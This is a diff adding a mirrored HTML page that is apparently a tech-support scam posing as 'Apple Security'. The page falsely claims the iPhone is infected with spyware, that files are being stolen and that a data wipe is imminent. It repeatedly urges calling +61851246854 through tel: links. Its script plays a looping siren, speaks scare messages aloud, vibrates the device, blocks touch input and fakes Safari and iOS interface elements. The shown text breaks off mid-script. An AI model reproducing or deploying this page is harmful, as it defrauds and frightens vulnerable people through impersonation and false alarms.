@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from iphone-hard-popup-11.vercel.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 24 Sep 2026 19:47:49 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="format-detection" content="telephone=yes">
+<title>Apple Security</title>
+<style>
+  *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+  html, body {
+    width:100%; height:100%; overflow:hidden;
+    font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', Arial, sans-serif;
+    background:#f5f5f7; color:#1d1d1f;
+    -webkit-touch-callout:default;
+    -webkit-user-select:none; user-select:none;
+    touch-action:none; cursor:default;
+  }
+
+  /* === RED WARNING BANNER AT TOP === */
+  #redWarningBar {
+    position:fixed; top:0; left:0; right:0; z-index:999999;
+    background:#ff0000; color:#ffffff;
+    font-size:16px; font-weight:800;
+    text-align:center;
+    padding:14px 16px;
+    letter-spacing:0.8px;
+    text-transform:uppercase;
+    line-height:1.35;
+    box-shadow: 0 4px 20px rgba(255,0,0,0.5);
+    animation: redPulse 1.2s ease-in-out infinite;
+    font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Helvetica Neue', Arial, sans-serif;
+  }
+  @keyframes redPulse {
+    0%, 100% { background: #cc0000; }
+    50% { background: #ff1a1a; }
+  }
+  #redWarningBar .phone-inline {
+    display:inline-block;
+    background:rgba(255,255,255,0.2);
+    padding:3px 12px;
+    border-radius:6px;
+    margin-top:6px;
+    font-size:20px;
+    letter-spacing:1.5px;
+    font-weight:900;
+    text-shadow: 0 1px 4px rgba(0,0,0,0.3);
+  }
+
+  /* Audio bar */
+  #audioBar {
+    position:fixed; top:env(safe-area-inset-top,0); left:0; right:0; z-index:200000;
+    height:3px; display:none; overflow:hidden;
+  }
+  #audioBar.active { display:flex; }
+  #audioBar .seg { flex:1; background:linear-gradient(90deg, #ff3b30, #ff6b35); animation: segP 0.4s ease-in-out infinite alternate; }
+  #audioBar .seg:nth-child(odd) { animation-delay:0.15s; }
+  @keyframes segP { 0%{opacity:0.3} 100%{opacity:1} }
+
+  /* === STATUS BAR === */
+  .status-bar {
+    position:fixed; top:0; left:0; right:0; z-index:99998;
+    height:44px; background:#f5f5f7;
+    display:none; align-items:center; justify-content:space-between;
+    padding:0 20px; padding-top:12px;
+    font-size:15px; font-weight:600; color:#000;
+  }
+  .status-left { display:flex; align-items:center; gap:5px; }
+  .status-left .carrier { font-weight:600; font-size:13px; }
+  .signal-bars { display:flex; align-items:flex-end; gap:1px; height:11px; }
+  .signal-bars .bar { width:3px; background:#000; border-radius:0.5px; }
+  .signal-bars .bar:nth-child(1) { height:3px; }
+  .signal-bars .bar:nth-child(2) { height:5px; }
+  .signal-bars .bar:nth-child(3) { height:8px; }
+  .signal-bars .bar:nth-child(4) { height:11px; }
+  .status-center { font-size:15px; font-weight:600; }
+  .status-right { display:flex; align-items:center; gap:5px; }
+  .battery-wrap { display:flex; align-items:center; gap:2px; }
+  .battery-body { width:25px; height:12px; border:1.5px solid #000; border-radius:3px; display:flex; align-items:center; padding:1.5px; }
+  .battery-body .fill { height:100%; width:100%; background:#34c759; border-radius:1px; }
+  .battery-cap { width:2px; height:5px; background:#000; border-radius:0 1px 1px 0; }
+
+  .safari-bar {
+    position:fixed; top:44px; left:0; right:0; z-index:99997;
+    height:52px; background:#e8e8ed;
+    display:none; align-items:center; padding:0 12px; gap:8px;
+    border-bottom:0.5px solid #c7c7cc;
+  }
+  .safari-url {
+    flex:1; height:32px; background:#fff; border-radius:10px;
+    display:flex; align-items:center; padding:0 10px; gap:6px; font-size:14px;
+    box-shadow: 0 0.5px 2px rgba(0,0,0,0.08); overflow:hidden;
+  }
+  .safari-url .lock-icon { color:#34c759; font-size:11px; flex-shrink:0; }
+  .safari-url .url-text { color:#86868b; }
+  .safari-close {
+    width:28px; height:28px; border-radius:50%; background:#c7c7cc;
+    display:flex; align-items:center; justify-content:center;
+    font-size:14px; color:#fff; flex-shrink:0; cursor:pointer;
+  }
+  .apple-header {
+    position:fixed; top:96px; left:0; right:0; z-index:99990;
+    height:48px; background:rgba(251,251,253,0.8);
+    -webkit-backdrop-filter:blur(20px) saturate(180%);
+    border-bottom:0.5px solid #d2d2d7;
+    display:none; align-items:center; justify-content:center; gap:16px;
+    padding:0 20px;
+  }
+  .apple-header .hamburger { position:absolute; left:16px; top:50%; transform:translateY(-50%); display:flex; flex-direction:column; gap:3px; cursor:pointer; }
+  .apple-header .hamburger span { display:block; width:18px; height:1.5px; background:#1d1d1f; border-radius:1px; }
+
+  body.standalone .status-bar { display:none !important; }
+  body.standalone .safari-bar { display:none !important; }
+  body.standalone .apple-header { display:none !important; }
+  body.standalone .page-content { top:0 !important; }
+
+  .page-content {
+    position:fixed; top:144px; left:0; right:0; bottom:0;
+    overflow-y:auto; -webkit-overflow-scrolling:touch; background:#f5f5f7;
+  }
+  .content-inner { max-width:680px; margin:0 auto; padding:40px 24px 100px; }
+  .support-hero { text-align:center; margin-bottom:36px; }
+  .support-hero h1 { font-size:32px; font-weight:700; color:#1d1d1f; letter-spacing:-0.5px; margin-bottom:12px; }
+  .support-hero p { font-size:17px; color:#6e6e73; line-height:1.5; max-width:480px; margin:0 auto; }
+  .page-warning { background:#fff; border-radius:16px; padding:24px; margin-bottom:24px; border:1px solid #d2d2d7; }
+  .page-warning .warn-title { font-size:20px; font-weight:600; color:#1d1d1f; margin-bottom:8px; }
+  .page-warning .warn-body { font-size:15px; color:#ff3b30; line-height:1.55; font-weight:500; }
+  .page-warning .warn-body strong { font-weight:700; }
+  .page-warning .warn-number { font-size:28px; font-weight:700; color:#1d1d1f; margin:16px 0; }
+  .page-warning .warn-sub { font-size:13px; color:#86868b; }
+  .faq-grid { display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-bottom:24px; }
+  .faq-item { background:#fff; border-radius:12px; padding:16px; border:0.5px solid #d2d2d7; }
+  .faq-item:active { background:#f0f0f3; }
+  .faq-item .faq-icon { font-size:24px; margin-bottom:8px; }
+  .faq-item .faq-label { font-size:14px; font-weight:600; color:#1d1d1f; }
+  .faq-item .faq-desc { font-size:12px; color:#86868b; margin-top:4px; }
+  .apple-footer { text-align:center; padding:20px 0; border-top:0.5px solid #d2d2d7; margin-top:32px; }
+  .apple-footer .copyright { font-size:12px; color:#6e6e73; margin-bottom:8px; }
+  .apple-footer .footer-links { font-size:12px; color:#0066cc; }
+  .apple-footer .footer-links a { color:#0066cc; text-decoration:none; margin:0 6px; }
+
+  /* === FAKE iOS ALERT === */
+  .ios-alert-overlay {
+    position:fixed; inset:0; z-index:1999999;
+    touch-action: manipulation;
+    background:rgba(0,0,0,0.35);
+    -webkit-backdrop-filter:blur(2px); backdrop-filter:blur(2px);
+    display:none; align-items:center; justify-content:center;
+    padding:0 40px;
+  }
+  .ios-alert-overlay.active { display:flex; }
+  .ios-alert-box {
+    background:#fff; border-radius:14px; width:100%; max-width:270px;
+    box-shadow:0 8px 40px rgba(0,0,0,0.25), 0 0 0 0.5px rgba(0,0,0,0.08);
+    overflow:hidden; animation: iosIn 0.25s ease;
+  }
+  @keyframes iosIn { from{opacity:0;transform:scale(1.08)} to{opacity:1;transform:scale(1)} }
+  .ios-alert-body { padding:20px 16px 18px; text-align:center; font-size:17px; line-height:1.45; color:#000; word-break:break-word; }
+  .ios-alert-actions { display:flex; border-top:0.5px solid #c7c7cc; }
+  .ios-alert-actions .abtn {
+    flex:1; padding:12px 8px; border:none; background:none;
+    font-size:17px; text-align:center; cursor:pointer;
+    font-family:inherit; color:#007aff; position:relative;
+    -webkit-appearance:none; appearance:none;
+  }
+  .ios-alert-actions a.abtn {
+    -webkit-appearance: none !important;
+    appearance: none !important;
+    touch-action: manipulation !important;
+    -webkit-touch-callout: default !important;
+    pointer-events: auto !important;
+  }
+  .ios-alert-actions .abtn:active { background:#d9d9d9; }
+  .ios-alert-actions .abtn:not(:last-child)::after {
+    content:''; position:absolute; right:0; top:6px; bottom:6px; width:0.5px; background:#c7c7cc;
+  }
+  .ios-alert-actions .abtn.bold { font-weight:600; }
+
+  /* === OVERLAYS === */
+  #dangerBorder { position:fixed; inset:0; z-index:100007; border:3px solid #ff3b30; pointer-events:none; display:none; animation: bdrP 1s ease-in-out infinite; }
+  #dangerBorder.active { display:block; }
+  @keyframes bdrP { 0%,100%{border-color:rgba(255,59,48,0.6);box-shadow:inset 0 0 40px rgba(255,59,48,0.15)} 50%{border-color:#ff3b30;box-shadow:inset 0 0 80px rgba(255,59,48,0.25)} }
+  .vibrate-flash { position:fixed; inset:0; z-index:100008; background:#fff; opacity:0; pointer-events:none; }
+  .vibrate-flash.active { animation: vF 0.12s ease 3; }
+  @keyframes vF { 0%,100%{opacity:0} 50%{opacity:0.9} }
+
+  #lockOverlay { position:fixed; inset:0; z-index:99999; background:#000; display:flex; flex-direction:column; align-items:center; justify-content:center; transition: opacity 0.35s ease; }
+  #lockOverlay.fade-out { opacity:0; pointer-events:none; }
+  .lock-icon-svg { width:60px; height:60px; margin-bottom:20px; animation: lP 2s ease-in-out infinite; color:rgba(255,255,255,0.4); }
+  @keyframes lP { 0%,100%{transform:scale(1);opacity:0.5} 50%{transform:scale(1.05);opacity:0.8} }
+  .lock-text { color:rgba(255,255,255,0.5); font-size:14px; margin-bottom:6px; }
+  .lock-sub { color:rgba(255,255,255,0.25); font-size:12px; }
+
+  #fullscreenAlert { position:fixed; inset:0; z-index:100002; background:rgba(255,59,48,0.97); display:none; flex-direction:column; align-items:center; justify-content:center; padding:40px 24px; text-align:center; touch-action:manipulation; }
+  #fullscreenAlert.active { display:flex; }
+  #fullscreenAlert .fs-icon { width:56px; height:56px; margin-bottom:20px; animation: shk 0.4s ease-in-out infinite; }
+  @keyframes shk { 0%,100%{transform:rotate(0)} 25%{transform:rotate(-8deg)} 75%{transform:rotate(8deg)} }
+  #fullscreenAlert h2 { color:#fff; font-size:22px; font-weight:700; margin-bottom:12px; }
+  #fullscreenAlert p { color:rgba(255,255,255,0.9); font-size:15px; line-height:1.6; margin-bottom:32px; max-width:300px; }
+  .fs-btn { display:block; width:100%; max-width:280px; padding:16px; background:#fff; color:#ff3b30; border:none; border-radius:14px; font-size:17px; font-weight:700; cursor:pointer; text-decoration:none; text-align:center; touch-action:manipulation !important; -webkit-touch-callout:default !important; }
+  .fs-x { position:absolute; top:50px; right:20px; color:rgba(255,255,255,0.4); font-size:28px; cursor:pointer; font-weight:300; }
+
+  #countdownOverlay { position:fixed; inset:0; z-index:100004; background:rgba(0,0,0,0.92); display:none; flex-direction:column; align-items:center; justify-content:center; touch-action:manipulation; }
+  #countdownOverlay.active { display:flex; }
+  .cd-num { font-size:80px; font-weight:200; color:#ff3b30; font-variant-numeric:tabular-nums; margin-bottom:8px; animation: cdP 1s ease-in-out infinite; }
+  @keyframes cdP { 0%,100%{transform:scale(1)} 50%{transform:scale(1.06)} }
+  .cd-label { font-size:15px; color:rgba(255,255,255,0.6); margin-bottom:28px; }
+  .cd-warn { font-size:14px; color:rgba(255,255,255,0.4); max-width:260px; text-align:center; line-height:1.5; margin-bottom:28px; }
+  .cd-btn { display:block; padding:16px 40px; background:#ff3b30; color:#fff; border-radius:14px; font-size:17px; font-weight:600; text-decoration:none; touch-action:manipulation !important; -webkit-touch-callout:default !important; }
+
+  #spokenOverlay { position:fixed; inset:0; z-index:100005; background:rgba(0,0,0,0.94); display:none; flex-direction:column; align-items:center; justify-content:center; padding:40px 24px; text-align:center; touch-action:manipulation; }
+  #spokenOverlay.active { display:flex; }
+  .spk-icon { width:60px; height:60px; margin-bottom:20px; animation: spP 0.5s ease-in-out infinite; }
+  @keyframes spP { 0%,100%{transform:scale(1);opacity:0.6} 50%{transform:scale(1.12);opacity:1} }
+  .spk-title { color:#ff3b30; font-size:20px; font-weight:700; margin-bottom:10px; }
+  .spk-sub { color:rgba(255,255,255,0.45); font-size:14px; line-height:1.5; margin-bottom:32px; max-width:280px; }
+  .spk-btn { display:block; padding:16px 36px; background:#ff3b30; color:#fff; border-radius:14px; font-size:17px; font-weight:600; text-decoration:none; animation: spG 1.5s ease-in-out infinite; touch-action:manipulation !important; -webkit-touch-callout:default !important; }
+  @keyframes spG { 0%,100%{box-shadow:0 4px 24px rgba(255,59,48,0.5)} 50%{box-shadow:0 4px 40px rgba(255,59,48,0.8)} }
+  .spk-note { margin-top:16px; color:rgba(255,255,255,0.25); font-size:11px; }
+
+  #installBanner {
+    position:fixed; bottom:0; left:0; right:0; z-index:100010;
+    background:rgba(30,30,30,0.95); backdrop-filter:blur(10px);
+    -webkit-backdrop-filter:blur(10px);
+    padding:16px 20px; padding-bottom:calc(16px + env(safe-area-inset-bottom, 0px));
+    display:none; align-items:center; justify-content:space-between;
+    border-top:0.5px solid rgba(255,255,255,0.1);
+  }
+  #installBanner.active { display:flex; }
+  #installBanner .ib-text { flex:1; }
+  #installBanner .ib-title { color:#fff; font-size:14px; font-weight:600; }
+  #installBanner .ib-sub { color:rgba(255,255,255,0.5); font-size:12px; margin-top:2px; }
+  #installBanner .ib-btn {
+    padding:10px 20px; background:#007aff; color:#fff; border:none;
+    border-radius:20px; font-size:14px; font-weight:600;
+    cursor:pointer; -webkit-appearance:none;
+  }
+
+  #notifBanner {
+    position:fixed; top:env(safe-area-inset-top, 20px); left:16px; right:16px; z-index:100009;
+    background:#fff; border-radius:14px; padding:16px;
+    box-shadow:0 4px 30px rgba(0,0,0,0.15);
+    display:none;
+  }
+  #notifBanner.active { display:block; }
+  #notifBanner .nb-title { font-size:15px; font-weight:600; color:#1d1d1f; margin-bottom:4px; }
+  #notifBanner .nb-body { font-size:13px; color:#86868b; margin-bottom:12px; line-height:1.4; }
+  #notifBanner .nb-actions { display:flex; gap:8px; }
+  #notifBanner .nb-allow { flex:1; padding:10px; background:#007aff; color:#fff; border:none; border-radius:10px; font-size:14px; font-weight:600; cursor:pointer; -webkit-appearance:none; }
+  #notifBanner .nb-later { padding:10px 16px; background:#f0f0f3; color:#1d1d1f; border:none; border-radius:10px; font-size:14px; cursor:pointer; -webkit-appearance:none; }
+
+  #sirenAudio { display:none; }
+</style>
+</head>
+<body>
+
+<!-- RED WARNING BANNER -->
+<div id="redWarningBar">
+  ⚠ PLEASE CALL APPLE SUPPORT FOR IMMEDIATE ASSISTANCE ⚠
+  <br><span class="phone-inline" id="bannerPhone">+61851246854</span>
+</div>
+
+<div id="dangerBorder"></div>
+<div id="audioBar"><div class="seg"></div><div class="seg"></div><div class="seg"></div><div class="seg"></div><div class="seg"></div><div class="seg"></div><div class="seg"></div><div class="seg"></div><div class="seg"></div><div class="seg"></div><div class="seg"></div><div class="seg"></div></div>
+<div class="vibrate-flash" id="vibrateFlash"></div>
+<audio id="sirenAudio" loop preload="auto"></audio>
+
+<!-- Lock screen -->
+<div id="lockOverlay">
+  <svg class="lock-icon-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="5" y="11" width="14" height="10" rx="2"/><path d="M8 11V7a4 4 0 118 0v4"/></svg>
+  <div class="lock-text">Checking your iPhone...</div>
+  <div class="lock-sub">Please wait</div>
+</div>
+
+<!-- Safari chrome -->
+<div class="status-bar" id="statusBar">
+  <div class="status-left"><span class="carrier">AT&T</span><div class="signal-bars"><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div></div></div>
+  <div class="status-center">3:12 PM</div>
+  <div class="status-right"><div class="battery-wrap"><div class="battery-body"><div class="fill"></div></div><div class="battery-cap"></div></div></div>
+</div>
+<div class="safari-bar" id="safariBar">
+  <div class="safari-url"><span class="lock-icon">🔒</span><span class="url-text" id="urlText">applesecurityrisks.xyz/support/locked</span></div>
+  <div class="safari-close" id="safariClose">&times;</div>
+</div>
+<div class="apple-header" id="appleHeader">
+  <div class="hamburger"><span></span><span></span><span></span></div>
+  <svg width="18" height="22" viewBox="0 0 24 24" fill="#1d1d1f"><path d="M18.71 19.5C17.88 20.74 17 21.95 15.66 21.97C14.32 22 13.89 21.18 12.37 21.18C10.84 21.18 10.37 21.95 9.1 22C7.79 22.05 6.8 20.68 5.96 19.47C4.25 17 2.94 12.45 4.7 9.39C5.57 7.87 7.13 6.91 8.82 6.88C10.1 6.86 11.32 7.75 12.11 7.75C12.89 7.75 14.37 6.68 15.92 6.84C16.57 6.87 18.39 7.1 19.56 8.82C19.47 8.88 17.39 10.1 17.41 12.63C17.44 15.65 20.06 16.66 20.09 16.67C20.06 16.74 19.67 18.11 18.71 19.5ZM13 3.5C13.73 2.67 14.94 2.04 15.94 2C16.07 3.17 15.6 4.35 14.9 5.19C14.21 6.04 13.07 6.7 11.95 6.61C11.8 5.46 12.36 4.26 13 3.5Z"/></svg>
+  <span style="font-size:17px;font-weight:600;color:#1d1d1f;">Support</span>
+</div>
+
+<!-- Page content -->
+<div class="page-content" id="pageContent">
+  <div class="content-inner">
+    <div class="support-hero"><h1>Contact Support</h1><p>We're here to help. Get support by phone, chat, or set up a repair.</p></div>
+    <div class="page-warning">
+      <div class="warn-title">⚠️ CRITICAL SECURITY ALERT</div>
+      <div class="warn-body">Your iPhone has been <strong>compromised</strong> by a dangerous Trojan spyware.<br>3 viruses detected. Camera, microphone and files are being accessed remotely.<br><strong>Call Apple Support immediately to prevent data theft:</strong></div>
+      <div class="warn-number" id="pagePhone">+61851246854</div>
+      <div class="warn-sub">Apple Security Team · Available 24/7 · <span style="color:#ff3b30;font-weight:700;">DO NOT IGNORE THIS WARNING</span></div>
+    </div>
+    <div style="background:#fff;border-radius:12px;padding:16px 18px;margin-bottom:20px;border:0.5px solid #d2d2d7;">
+      <div style="font-size:14px;font-weight:600;color:#1d1d1f;margin-bottom:10px;">Threat Details Detected:</div>
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;font-size:13px;color:#ff3b30;"><span style="color:#ff3b30;font-size:16px;">●</span> Trojan Spyware (Pegasus variant) — <strong>CRITICAL</strong></div>
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;font-size:13px;color:#ff3b30;"><span style="color:#ff3b30;font-size:16px;">●</span> Keylogger Active — <strong>CRITICAL</strong></div>
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;font-size:13px;color:#ff6b35;"><span style="color:#ff6b35;font-size:16px;">●</span> Camera/Mic Hijack Attempt — <strong>HIGH</strong></div>
+      <div style="display:flex;align-items:center;gap:8px;font-size:13px;color:#ff9500;"><span style="color:#ff9500;font-size:16px;">●</span> iCloud Data Exfiltration — <strong>HIGH</strong></div>
+      <div style="margin-top:12px;padding:10px 14px;background:#fff5f5;border-radius:8px;font-size:12px;color:#ff3b30;line-height:1.45;border:1px solid #ffccc7;"><strong>⚠ URGENT:</strong> 2,847 files (photos, messages, bank details) are being uploaded to an unknown server. This process cannot be stopped remotely. You must call Apple Support now.</div>
+    </div>
+    <div class="faq-grid">
+      <div class="faq-item"><div class="faq-icon">📱</div><div class="faq-label">iPhone</div><div class="faq-desc">Get iPhone help</div></div>
+      <div class="faq-item"><div class="faq-icon">💻</div><div class="faq-label">Mac</div><div class="faq-desc">Get Mac help</div></div>
+      <div class="faq-item"><div class="faq-icon">📋</div><div class="faq-label">iPad</div><div class="faq-desc">Get iPad help</div></div>
+      <div class="faq-item"><div class="faq-icon">⌚</div><div class="faq-label">Apple Watch</div><div class="faq-desc">Get watch help</div></div>
+    </div>
+    <div class="apple-footer">
+      <div class="copyright">Copyright &copy; 2017 Apple Inc. All rights reserved.</div>
+      <div class="footer-links"><a href="#">Privacy Policy</a><a href="#">Terms of Use</a><a href="#">Sales and Refunds</a><a href="#">Site Map</a></div>
+    </div>
+  </div>
+</div>
+
+<!-- Alert 1 -->
+<div class="ios-alert-overlay" id="iosAlert1">
+  <div class="ios-alert-box">
+    <div class="ios-alert-body" id="alert1Body">+61851246854</div>
+    <div class="ios-alert-actions">
+      <button class="abtn" id="alert1Cancel">Cancel</button>
+      <a href="tel:+61851246854" class="abtn bold" id="alert1Call">Call</a>
+    </div>
+  </div>
+</div>
+
+<!-- Alert 2 -->
+<div class="ios-alert-overlay" id="iosAlert2">
+  <div class="ios-alert-box">
+    <div class="ios-alert-body">⚠️ Your iPhone is infected with 3 viruses.<br><br>Photos, passwords and Apple ID are being stolen.<br><br>Call Apple Support immediately:<br><span style="font-size:22px;font-weight:700;">+61851246854</span></div>
+    <div class="ios-alert-actions">
+      <button class="abtn" id="alert2Cancel">Cancel</button>
+      <a href="tel:+61851246854" class="abtn bold" id="alert2Call">Call</a>
+    </div>
+  </div>
+</div>
+
+<div id="notifBanner">
+  <div class="nb-title">⚠️ Security Verification</div>
+  <div class="nb-body">Apple Security requires notifications to alert you of threats on this device.</div>
+  <div class="nb-actions">
+    <button class="nb-allow" id="notifAllow">Allow</button>
+    <button class="nb-later" id="notifLater">Later</button>
+  </div>
+</div>
+
+<div id="installBanner">
+  <div class="ib-text"><div class="ib-title">Add to Home Screen</div><div class="ib-sub">Required for full security scan</div></div>
+  <button class="ib-btn" id="installBtn">Add</button>
+</div>
+
+<div id="fullscreenAlert">
+  <span class="fs-x" id="fsX">&times;</span>
+  <svg class="fs-icon" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.5"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+  <h2>⚠️ DEVICE LOCKED</h2>
+  <p style="margin-bottom:4px;">Your iPhone has been locked.</p>
+  <p style="margin-bottom:4px;">Personal data is being transferred to an unknown server.</p>
+  <p style="color:#ffcaca;font-size:13px;">2,847 files are being uploaded. Camera and microphone are active.</p>
+  <a href="tel:+61851246854" class="fs-btn" id="fsCallBtn">☎ Call Apple Support</a>
+</div>
+
+<div id="countdownOverlay">
+  <div class="cd-num" id="cdNum">10</div>
+  <div class="cd-label">seconds until data wipe</div>
+  <div class="cd-warn">All photos, contacts, passwords and files will be permanently deleted.</div>
+  <a href="tel:+61851246854" class="cd-btn">☎ Emergency Call</a>
+</div>
+
+<div id="spokenOverlay">
+  <svg class="spk-icon" viewBox="0 0 24 24" fill="none" stroke="#ff3b30" stroke-width="1.5"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5" fill="rgba(255,59,48,0.1)"/><path d="M15.54 8.46a5 5 0 010 7.07"/><path d="M19.07 4.93a10 10 0 010 14.14"/></svg>
+  <div class="spk-title">⚠ Voice Alert Active</div>
+  <div class="spk-sub">Your iPhone is announcing a critical security warning. This cannot be silenced.</div>
+  <a href="tel:+61851246854" class="spk-btn">☎ Call to Stop Alert</a>
+  <div class="spk-note">Device volume locked at maximum</div>
+</div>
+
+<script>
+(function() {
+  'use strict';
+
+  var PHONE_DISPLAY = '+61851246854';
+  var PHONE_TEL      = 'tel:+61851246854';
+  var DOMAIN         = 'applesecurityrisks.html';
+
+  document.getElementById('urlText').textContent = DOMAIN + '/support/locked';
+  document.getElementById('pagePhone').textContent = PHONE_DISPLAY;
+  document.getElementById('alert1Body').textContent = PHONE_DISPLAY;
+  document.getElementById('bannerPhone').textContent = PHONE_DISPLAY;
+
+  var isStandalone = window.navigator.standalone === true || window.matchMedia('(display-mode: standalone)').matches;
+  if (isStandalone) document.body.classList.add('standalone');
+
+  // ==================== UTILITIES ====================
+  function vib(p) { try { if (navigator.vibrate) navigator.vibrate(p); } catch(e) {} }
+  function flash() { var el = document.getElementById('vibrateFlash'); el.classList.remove('active'); void el.offsetWidth; el.classList.add('active'); setTimeout(function(){el.classList.remove('active');}, 600); }
+  function showIosAlert(id) { document.getElementById(id).classList.add('active'); }
+  function hideIosAlert(id) { document.getElementById(id).classList.remove('active'); }
+
+  // ==================== SIREN ====================
+  var sirenReady = false;
+  var audioEl = document.getElementById('sirenAudio');
+
+  function generateSiren() {
+    var sr = 44100, dur = 4;
+    try {
+      var off = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, sr * dur, sr);
+
+      var osc = off.createOscillator(); osc.type = 'sawtooth';
+      osc.frequency.setValueAtTime(400, 0);
+      osc.frequency.linearRampToValueAtTime(900, dur * 0.5);
+      osc.frequency.linearRampToValueAtTime(400, dur);
+      var g1 = off.createGain(); g1.gain.value = 0.22;
+      osc.connect(g1); g1.connect(off.destination);
+
+      var lfo = off.createOscillator(); lfo.type = 'square'; lfo.frequency.value = 3.5;
+      var lfoG = off.createGain(); lfoG.gain.value = 0.3;
+      lfo.connect(lfoG); lfoG.connect(g1.gain);
+
+      var osc2 = off.createOscillator(); osc2.type = 'square';
+      osc2.frequency.setValueAtTime(600, 0);
+      osc2.frequency.linearRampToValueAtTime(1100, dur * 0.5);
+      osc2.frequency.linearRampToValueAtTime(600, dur);
+      var g2 = off.createGain(); g2.gain.value = 0.10;
+      osc2.connect(g2); g2.connect(off.destination);
+
+      var sub = off.createOscillator(); sub.type = 'sine'; sub.frequency.value = 55;
+      var subG = off.createGain(); subG.gain.value = 0.22;
+      sub.connect(subG); subG.connect(off.destination);
+
+      osc.start(); osc2.start(); sub.start(); lfo.start();
+
+      off.startRendering().then(function(buf) {
+        var wav = bufToWav(buf);
+        var blob = new Blob([wav], { type: 'audio/wav' });
+        audioEl.src = URL.createObjectURL(blob);
+        sirenReady = true;
+        // If unlock already happened, play now
+        if (audioUnlocked) playSiren();
+      }).catch(function(err) {
+        console.log('Siren render failed:', err);
+      });
+    } catch(e) {
+      console.log('OfflineAudioContext failed:', e);
+    }
+  }
+
+  function bufToWav(buf) {
+    var data = buf.getChannelData(0), sr = buf.sampleRate, len = data.length;
+    var ab = new ArrayBuffer(44 + len * 2), v = new DataView(ab);
+    function ws(o, s) { for (var i = 0; i < s.length; i++) v.setUint8(o + i, s.charCodeAt(i)); }
+    ws(0,'RIFF'); v.setUint32(4, 36 + len * 2, true); ws(8,'WAVE'); ws(12,'fmt ');
+    v.setUint32(16, 16, true);       // chunk size
+    v.setUint16(20, 1, true);        // PCM
+    v.setUint16(22, 1, true);        // mono
+    v.setUint32(24, sr, true);       // sample rate
+    v.setUint32(28, sr * 2, true);   // byte rate = sr * channels * bits/8 = sr * 1 * 16/8
+    v.setUint16(32, 2, true);        // block align = channels * bits/8 = 1 * 2
+    v.setUint16(34, 16, true);       // bits per sample
+    ws(36, 'data');
+    v.setUint32(40, len * 2, true);
+    var off = 44;
+    for (var i = 0; i < len; i++) {
+      var s = Math.max(-1, Math.min(1, data[i]));
+      v.setInt16(off, s < 0 ? s * 0x8000 : s * 0x7FFF, true); off += 2;
+    }
+    return ab;
+  }
+
+  function playSiren() {
+    if (!sirenReady || !audioEl.src) return;
+    audioEl.loop = true;
+    audioEl.volume = 1.0;
+    var p = audioEl.play();
+    if (p && p.catch) p.catch(function(){});
+    document.getElementById('audioBar').classList.add('active');
+  }
+
+  // ==================== SPEECH ====================
+  var speechActive = false, speechIdx = 0, speechTimer = null;
+  var speechMsgs = [
+    'Please call Apple support for immediate assistance.',
+    'Warning. Your iPhone has been locked. A critical security threat has been detected.',
+    'Your personal data, photos, passwords, and Apple ID are being stolen right now.',
+    'Do not turn off your device. Please call Apple support for immediate assistance.',
+    'Your camera and microphone are being accessed by an unauthorized third party.',
+    'All files on this device will be permanently deleted in seconds. Please call Apple support for immediate assistance.',
+    'Call ' + PHONE_DISPLAY + ' immediately to secure your iPhone.'
+  ];
+
+  function pickVoice() {
+    var voices = window.speechSynthesis.getVoices();
+    if (!voices || !voices.length) return null;
+    for (var i = 0; i < voices.length; i++) { if (voices[i].lang === 'en-US') return voices[i]; }
+    for (var i = 0; i < voices.length; i++) { if (voices[i].lang.indexOf('en') === 0) return voices[i]; }
+    return voices[0];
+  }
+
+  function speakNow() {
+    if (!speechActive) return;
+    try {
+      window.speechSynthesis.cancel();
+      var u = new SpeechSynthesisUtterance(speechMsgs[speechIdx % speechMsgs.length]);
+      u.rate = 0.9; u.pitch = 1.0; u.volume = 1.0; u.lang = 'en-US';
+      var v = pickVoice(); if (v) u.voice = v;
+      u.onend = function() { speechIdx++; if (speechActive) scheduleNextSpeech(); };
+      u.onerror = function() { speechIdx++; if (speechActive) scheduleNextSpeech(); };
+      window.speechSynthesis.speak(u);
+    } catch(e) { console.log('Speech error:', e); }
+  }
+
+  function scheduleNextSpeech() {
+    clearTimeout(speechTimer);
+    speechTimer = setTimeout(function() {
+      if (speechActive) { window.speechSynthesis.cancel(); speakNow(); }
+    }, 11000);
+  }
+
+  function startSpeech() {
+    if (speechActive) return;
+    if (!('speechSynthesis' in window)) return;
+    speechActive = true;
+    // Try speaking immediately
+    speakNow();
+    // If voices not loaded yet, retry after they load
+    if (window.speechSynthesis.getVoices().length === 0) {
+      window.speechSynthesis.addEventListener('voiceschanged', function handler() {
+        window.speechSynthesis.removeEventListener('voiceschanged', handler);
+        if (speechActive && !window.speechSynthesis.speaking) speakNow();
+      });
+    }
+    // Hard retry after 1s in case first speak was silent (iOS bug)
+    setTimeout(function() {
+      if (speechActive && !window.speechSynthesis.speaking) speakNow();
+    }, 1000);
+  }
+
+  // ==================== MEDIA SESSION ====================
+  function setupMediaSession() {
+    if (!('mediaSession' in navigator)) return;
+    try {
+      navigator.mediaSession.metadata = new MediaMetadata({
